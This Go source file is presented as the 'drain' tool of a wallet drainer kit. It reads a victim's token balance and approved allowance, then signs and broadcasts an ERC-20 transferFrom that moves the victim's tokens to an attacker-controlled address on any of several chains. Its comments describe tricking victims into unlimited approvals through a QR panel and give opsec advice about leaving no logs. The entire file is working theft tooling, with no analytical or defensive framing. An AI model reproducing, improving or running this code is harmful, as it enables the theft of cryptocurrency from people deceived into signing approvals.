// drain — transferFrom tool for the Holocaust drainer.
//
// After a victim approves the receiver EOA (MaxUint256) via the panel's
// approve-mode QR, this tool pulls tokens with a plain ERC-20 transferFrom.
// No drainer contract: it signs and broadcasts an EIP-155 legacy transaction
// (max compatibility, lowest gas, no 1559 fields).
//
// Opsec: single binary, no config files, no logs — everything on the CLI.
// RPC may be the victim chain's public node or your own.
package main

import (
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
)

type rpcClient struct {
	url string
	hc  *http.Client
}

func (c *rpcClient) call(method string, params []interface{}) (string, error) {
	reqBody, _ := json.Marshal(map[string]interface{}{
		"jsonrpc": "2.0", "id": 1, "method": method, "params": params,
	})
	var resp struct {
		Result string `json:"result"`
		Error  *struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		} `json:"error"`
	}
	var lastErr error
	for _, delay := range []time.Duration{0, 2 * time.Second, 5 * time.Second} {
		if delay > 0 {
			time.Sleep(delay)
		}
		req, _ := http.NewRequest("POST", c.url, strings.NewReader(string(reqBody)))
		req.Header.Set("Content-Type", "application/json")
		httpResp, err := c.hc.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		body, _ := io.ReadAll(httpResp.Body)
		httpResp.Body.Close()
		if err := json.Unmarshal(body, &resp); err != nil {
			lastErr = fmt.Errorf("bad rpc response: %s", string(body))
			continue
		}
		if resp.Error != nil {
			return "", fmt.Errorf("rpc %s: %s", method, resp.Error.Message)
		}
		return resp.Result, nil
	}
	return "", lastErr
}

func pad64(s string) string {
	s = strings.TrimPrefix(strings.ToLower(s), "0x")
	for len(s) < 64 {
		s = "0" + s
	}
	return s
}

func mustHex(s string) []byte {
	b, err := hex.DecodeString(strings.TrimPrefix(s, "0x"))
	if err != nil {
		return []byte{}
	}
	return b
}

// callBigInt performs an eth_call with the given calldata and parses a uint.
func callBigInt(c *rpcClient, to, data string) (*big.Int, error) {
	params := []interface{}{map[string]string{"to": to, "data": data}, "latest"}
	out, err := c.call("eth_call", params)
	if err != nil {
		return nil, err
	}
	return new(big.Int).SetBytes(mustHex(out)), nil
}

// selectors: balanceOf(address)=0x70a08231, allowance(address,address)=0xdd62ed3e
func balanceOf(c *rpcClient, token, owner string) (*big.Int, error) {
	return callBigInt(c, token, "0x70a08231"+pad64(owner))
}

func allowance(c *rpcClient, token, owner, spender string) (*big.Int, error) {
	return callBigInt(c, token, "0xdd62ed3e"+pad64(owner)+pad64(spender))
}

// signTransferFrom builds, signs and RLP-encodes the legacy transferFrom tx.
// Returns the raw 0x-prefixed transaction, ready for eth_sendRawTransaction.
func signTransferFrom(privHex, token, from, to string, amount *big.Int,
	nonce, gasPrice, gas uint64, chainID int64) (string, error) {

	key, err := crypto.HexToECDSA(strings.TrimPrefix(privHex, "0x"))
	if err != nil {
		return "", err
	}
	// transferFrom(address from, address to, uint256 amount) = 0x23b872dd
	data := make([]byte, 4+96)
	copy(data, mustHex("23b872dd"))
	copy(data[4+12:], mustHex(strings.TrimPrefix(strings.ToLower(from), "0x"))) // address pad
	copy(data[4+32+12:], mustHex(strings.TrimPrefix(strings.ToLower(to), "0x")))
	copy(data[4+64:], amount.Bytes()) // uint256 big-endian, left-padded by zero space

	addr := common.HexToAddress(token)
	tx := types.NewTx(&types.LegacyTx{
		Nonce:    nonce,
		GasPrice: big.NewInt(int64(gasPrice)),
		Gas:      gas,
		To:       &addr,
		Value:    big.NewInt(0),
		Data:     data,
	})
	signer := types.NewEIP155Signer(big.NewInt(chainID))
	signed, err := types.SignTx(tx, signer, key)
	if err != nil {
		return "", err
	}
	raw, err := signed.MarshalBinary()
	if err != nil {
		return "", err
	}
	return "0x" + hex.EncodeToString(raw), nil
}

var chainIDs = map[string]int64{
	"eth-1": 1, "eth-56": 56, "eth-137": 137, "eth-42161": 42161,
	"eth-10": 10, "eth-8453": 8453, "eth-43114": 43114, "eth-250": 250,
}

func main() {
	key := flag.String("key", "", "receiver EOA private key (hex)")
	rpcURL := flag.String("rpc", "", "RPC endpoint URL")
	chain := flag.String("chain", "eth-1", "chain (eth-1, eth-56, eth-137, ...)")
	victim := flag.String("from", "", "victim address (0x...)")
	receiver := flag.String("to", "", "receiver address (0x...)")
	token := flag.String("token", "", "token contract (0x...)")
	amount := flag.String("amount", "all", "amount in base units, or 'all'")
	send := flag.Bool("send", false, "broadcast via eth_sendRawTransaction (default: print raw tx only)")
	flag.Parse()

	if *key == "" || *rpcURL == "" || *victim == "" || *receiver == "" || *token == "" {
		flag.Usage()
		os.Exit(2)
	}
	chainID, ok := chainIDs[*chain]
	if !ok {
		fmt.Fprintf(os.Stderr, "unknown chain %q\n", *chain)
		os.Exit(2)
	}
	c := &rpcClient{url: *rpcURL, hc: &http.Client{Timeout: 20 * time.Second}}

	bal, err := balanceOf(c, *token, *victim)
	if err != nil {
		fmt.Fprintln(os.Stderr, "balanceOf:", err)
		os.Exit(1)
	}
	allow, err := allowance(c, *token, *victim, *receiver)
	if err != nil {
		fmt.Fprintln(os.Stderr, "allowance:", err)
		os.Exit(1)
	}
	fmt.Printf("victim balance:        %s\nallowance to receiver: %s\n", bal.String(), allow.String())

	amt := bal
	if *amount != "all" {
		amt = new(big.Int)
		amt.SetString(*amount, 10)
		if amt.Cmp(bal) > 0 {
			amt = bal
		}
	}
	if amt.Sign() == 0 || allow.Sign() == 0 {
		fmt.Println("nothing to drain")
		return
	}
	if amt.Cmp(allow) > 0 {
		amt = allow
		fmt.Printf("clamping to allowance: %s\n", amt.String())
	}

	gpStr, err := c.call("eth_gasPrice", nil)
	if err != nil {
		fmt.Fprintln(os.Stderr, "gasPrice:", err)
		os.Exit(1)
	}
	gasPrice := new(big.Int).SetBytes(mustHex(gpStr)).Uint64()
	nonceStr, err := c.call("eth_getTransactionCount", []interface{}{*receiver, "pending"})
	if err != nil {
		fmt.Fprintln(os.Stderr, "nonce:", err)
		os.Exit(1)
	}
	nonce := new(big.Int).SetBytes(mustHex(nonceStr)).Uint64()

	raw, err := signTransferFrom(*key, *token, *victim, *receiver, amt, nonce, gasPrice, 90000, chainID)
	if err != nil {
		fmt.Fprintln(os.Stderr, "sign:", err)
		os.Exit(1)
	}
	if *send {
		if _, err := c.call("eth_sendRawTransaction", []interface{}{raw}); err != nil {
			fmt.Fprintln(os.Stderr, "send:", err)
			os.Exit(1)
		}
		fmt.Println("broadcast ok")
		return
	}
	fmt.Println("raw tx:", raw)
	fmt.Println("(dry run; pass -send to broadcast)")
}
